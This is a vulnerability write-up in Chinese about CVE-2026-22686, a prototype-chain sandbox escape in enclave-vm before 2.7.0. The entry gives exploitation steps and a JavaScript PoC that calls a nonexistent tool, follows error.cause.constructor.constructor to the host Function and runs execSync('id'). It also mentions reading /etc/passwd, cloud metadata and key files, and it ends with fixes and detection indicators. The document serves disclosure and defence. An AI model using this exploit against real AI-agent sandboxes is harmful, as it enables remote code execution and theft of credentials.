---
id: binary-pwn-sandbox-escape-enclave-vm-host-error-prototype-chain
title: enclave-vm < 2.7.0 工具调用错误暴露宿主 Error：cause.constructor.constructor 原型链逃逸（CVE-2026-22686）
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: enclave-vm-host-error-prototype-chain-escape
aliases:
- CVE-2026-22686
- enclave-vm 沙箱逃逸
- enclave-vm sandbox escape
- host Error cause 逃逸
- wrappedError 原型链
- createSafeError
- AI Agent 沙箱逃逸
tags:
- javascript
- nodejs
- sandbox-escape
- enclave-vm
- prototype-chain
- error-object
- ai-agent
- tool-call
- rce
- cve-2026-22686
cve:
- CVE-2026-22686
severity: critical
confidence: high
status: verified
affected_versions: < 2.7.0
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V175
  verified_at: '2026-11-06T11:44:52+08:00'
  notes: 已对照原文与 8 张图核对：CVE-2026-22686（CNA GitHub，CVSS 3.1 10.0）、<2.7.0 受影响且 2.7.0 修复、2.4.0 靶场源码、cause 引用宿主 Error、promise.then 无 rejection 处理、createSafeError 补丁均一致；versions 按原文记为 < 2.7.0。PoC 未独立复跑。
---

## 一句话结论

enclave-vm < 2.7.0 在沙箱代码调用不存在的工具时，宿主侧 `createHostCallToolProxy` 会把一个宿主 realm 的 `Error` 作为 `wrappedError.cause` 抛进沙箱；沙箱捕获后通过 `error.cause.constructor.constructor` 拿到宿主 `Function` 构造函数，执行 `Function('return process')()` 即可读取 `process.env`、文件系统并执行系统命令，完成沙箱逃逸（CVE-2026-22686，CVSS 10.0）。

## 原理

- enclave-vm 用双层 VM 隔离 AI Agent 执行的不可信 JavaScript：内层沙箱通过 `parent-vm-bootstrap.ts` 的 `innerCallTool` 调用宿主能力，`hostCallTool` 来自注入的 `__host_callTool__`，最终指向 `double-vm-wrapper.ts` 的 `createHostCallToolProxy`。
- `createHostCallToolProxy` 返回一个 async 函数：`await toolHandler(toolName, resolvedArgs)`。当工具不存在或 handler 抛错时进入 `catch`，执行 `const wrappedError = new Error(...); wrappedError.cause = err; throw wrappedError;`。这个 `new Error` 和 `err` 都是**宿主 realm** 的对象。
- async 函数中 `throw` 等价于返回 `Promise.reject(wrappedError)`；`innerCallTool` 只写了 `promise.then(...)`（且没有第二个 rejection 参数、没有 `.catch`），所以宿主侧的 rejected Promise 及其拒绝原因原样进入沙箱。
- 沙箱里 `await callTool(...)` 抛出的就是宿主 `wrappedError`。它的 `cause` 直接引用宿主原始 Error；沿 `hostError.constructor` 得到宿主 `Error` 构造函数，再 `.constructor` 得到宿主 `Function`。`Function('return process')()` 在宿主上下文编译执行，返回宿主 `process`，由此可 `require('child_process')`、读写文件、访问环境变量。
- 根因是跨 realm 对象泄漏：安全代理 `createSecureProxy` 只包装了 Promise 的 resolve 值，没有清洗 rejection reason；`cause` 又刻意保留了对宿主 Error 的直接引用，且没有切断原型链。只要宿主对象跨过边界且原型链完整，`constructor.constructor` 就是通用的逃逸放大器。
- 修复 `createSafeError` 用 `Object.setPrototypeOf(error, null)` 切断真实原型链，定义 null-prototype 的 `SafeConstructor` 让 `constructor.constructor` 返回自身而非函数，冻结 `constructor`/`__proto__`/`stack` 属性，并替换宿主侧所有暴露给沙箱的 `new Error`。

## 触发条件

- enclave-vm 版本 < 2.7.0（原文靶场 2.4.0）。
- 沙箱内运行的不可信 JavaScript 能调用 `callTool`，且可以传入任意工具名或触发 handler 抛错。
- 宿主工具 handler 的异常（工具不存在、参数校验失败、业务异常等）未被转换为安全错误，直接作为 `cause` 暴露给沙箱。
- 宿主进程为 Node.js，可访问 `process`、`require`、文件系统与网络；沙箱未额外用进程/容器/seccomp 隔离。
- AI Agent 场景中，攻击者能控制被执行代码（用户上传脚本、插件、模型生成代码）或能影响工具调用参数。

## 利用步骤

1. 在沙箱代码中调用不存在的工具：`await callTool('NON_EXISTENT_TOOL', {})`，迫使宿主 `toolHandler` 抛错并生成带 `cause` 的 `wrappedError`。
2. 用 `try/catch` 捕获该拒绝原因，取 `const hostError = error.cause`。
3. 取宿主构造函数：`const FunctionConstructor = hostError.constructor.constructor`。
4. 执行宿主代码：`const process = FunctionConstructor('return process')()`，读取 `process.cwd()`、`process.env`。
5. 进一步 `process.mainModule.require('child_process').execSync('id')` 或读取 `/etc/passwd`、云元数据、密钥文件，完成 RCE 与数据外带。
6. 若 `cause` 不在错误上，尝试 `error.stack`、`error.constructor`、Proxy trap、Promise rejection 回调等其他跨 realm 泄漏路径。

## PoC

```javascript
// 在 enclave-vm 沙箱内执行的不可信代码
async function exploit() {
  try {
    // 触发宿主 createHostCallToolProxy 的 catch 分支
    await callTool('NON_EXISTENT_TOOL', {});
  } catch (error) {
    // error 是宿主 realm 的 wrappedError
    const hostError = error.cause;                       // 宿主原始 Error
    const FunctionConstructor = hostError.constructor.constructor; // 宿主 Function
    const process = FunctionConstructor('return process')();

    const { execSync } = process.mainModule.require('child_process');
    return {
      compromised: true,
      cwd: process.cwd(),
      env: Object.keys(process.env),
      id: execSync('id').toString(),
    };
  }
}
```

```text
# 预期：返回宿主 cwd、环境变量名与 id 输出，证明代码在宿主 Node.js 上下文执行。
# 修复版本 2.7.0+ 中 createSafeError 切断原型链，上述 constructor.constructor 链返回 SafeConstructor 自身而非 Function。
```

## 变体与关联

- 变体：不依赖 `cause`，直接利用 `error.constructor.constructor`、`error.stack` 的 `prepareStackTrace`、Proxy 的 `getPrototypeOf`/`get` trap、`util.inspect` 自定义 inspect 等跨 realm 泄漏路径获取宿主 Function。
- 变体：工具参数/返回值中的宿主对象未深度清洗，通过 `sanitizeValue` 的边界（Date/Error 白名单、深度/属性数上限）夹带宿主原型对象。
- 变体：Promise 链中 `then` 的 rejection handler、`finally`、async 迭代器等未清洗的回调，可能把宿主异常或宿主对象带回沙箱。
- 关联：[[binary-pwn-sandbox-escape-vm2-cross-realm-implicit-call]]（vm2 的 Error.stack/Proxy/Promise 跨 realm 逃逸）、[[binary-pwn-sandbox-escape-nodejs-vm-constructor-constructor]]（Node 原生 vm 的 constructor.constructor 逃逸）、[[binary-pwn-sandbox-escape-fastgpt-inspect-fglobals-original-refs]]、[[binary-pwn-sandbox-escape-crawl4ai-hooks-import-whitelist-rce]]（AI 应用沙箱逃逸）。
- 边界：升级到 2.7.0+ 且所有宿主错误都走 `createSafeError` 后，本条链失效；若宿主还用独立进程/容器/seccomp 把沙箱与敏感资源隔离，逃逸后的危害也会被限制。

## 检测与防御

- 修复：升级 enclave-vm 至 2.7.0+；确保宿主侧所有可能暴露给沙箱的 `Error`/异常（工具不存在、参数校验、代理 trap、Promise rejection）都使用 `createSafeError`/`createSafeTypeError`，不要用裸 `new Error`。
- 修复：对 Promise 的 rejection reason 也做安全包装，不能只包装 resolve 值；禁止在错误对象上保留指向宿主对象的 `cause`。
- 加固：沙箱上下文设置 `codeGeneration: { strings: false, wasm: false }`；对返回值做深度/属性数/类型限制；不要在宿主全局暴露 `process`、`require`。
- 隔离：把不可信代码放到独立低权限进程/容器，配合 seccomp、只读文件系统、无网络或出站白名单；不要以持有云凭证的用户运行。
- 检测：沙箱代码出现 `callTool('不存在工具')` 后读取 `.cause`、`.constructor.constructor`、`Function('return process')`；沙箱进程异常拉起 `child_process`、读取 `/etc/passwd`/环境变量或外联；enclave-vm 日志中出现工具调用失败后紧跟原型链访问。
